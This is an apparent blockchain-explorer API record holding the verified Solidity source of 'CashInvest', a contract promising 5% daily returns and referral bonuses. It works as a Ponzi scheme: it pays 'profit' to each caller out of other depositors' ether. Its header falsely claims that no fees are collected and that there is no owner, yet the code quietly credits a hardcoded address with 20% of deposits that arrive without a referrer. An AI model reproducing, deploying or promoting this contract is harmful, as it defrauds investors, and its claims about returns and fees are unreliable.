{"status":"1","message":"OK","result":[{"SourceCode":"/**\r\n *\r\n *  Cash Investment Contract\r\n *  - GAIN 5% PER 24 HOURS (every 5900 blocks)\r\n *  - Every day the percentage increases by 0.25%\r\n *  - You will receive 10% of each deposit of your referral\r\n *  - Your referrals will receive 10% bonus\r\n *  - NO COMMISSION on your investment (every ether stays on contract's balance)\r\n *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\r\n *\r\n * How to use:\r\n *  1. Send any amount of ether to make an investment\r\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\r\n *  OR\r\n *  2b. Send more ether to reinvest AND get your profit at the same time\r\n *\r\n * RECOMMENDED GAS LIMIT: 100000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n * \r\n *\r\n */\r\ncontract CashInvest {\r\n    // records amounts invested\r\n    mapping (address => uint256) invested;\r\n    // records blocks at which investments were made\r\n    mapping (address => uint256) atBlock;\r\n    \r\n    function bytesToAddress(bytes bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n\r\n    // this function called every time anyone sends a transaction to this contract\r\n    function ()  payable {\r\n          \r\n            \r\n        if (invested[msg.sender] != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;\r\n            \r\n            amount +=amount*((block.number - 6550501)/118000);\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            address sender = msg.sender;\r\n            \r\n             if (amount > address(this).balance) {sender.send(address(this).balance);}\r\n             else  sender.send(amount);\r\n            \r\n        }\r\n        \r\n         \r\n\r\n        // record block number and invested amount (msg.value) of this transaction\r\n        atBlock[msg.sender] = block.number;\r\n        invested[msg.sender] += msg.value;\r\n        //referral\r\n         address referrer = bytesToAddress(msg.data);\r\n            if (invested[referrer] > 0 && referrer != msg.sender) {\r\n                invested[msg.sender] += msg.value/10;\r\n                invested[referrer] += msg.value/10;\r\n            \r\n            } else {\r\n                invested[0xA8A297C1aC6a11c2118173ba976eA2D45Cc82188] += msg.value/5;\r\n            }\r\n        \r\n        \r\n       \r\n    }\r\n}","ABI":"[{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"CashInvest","CompilerVersion":"v0.4.24+commit.e67f0147","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://306569fe107791ab5b959f97f3b5431f224c9dac3ae7c1a820a429e5cc98d6b8"}]}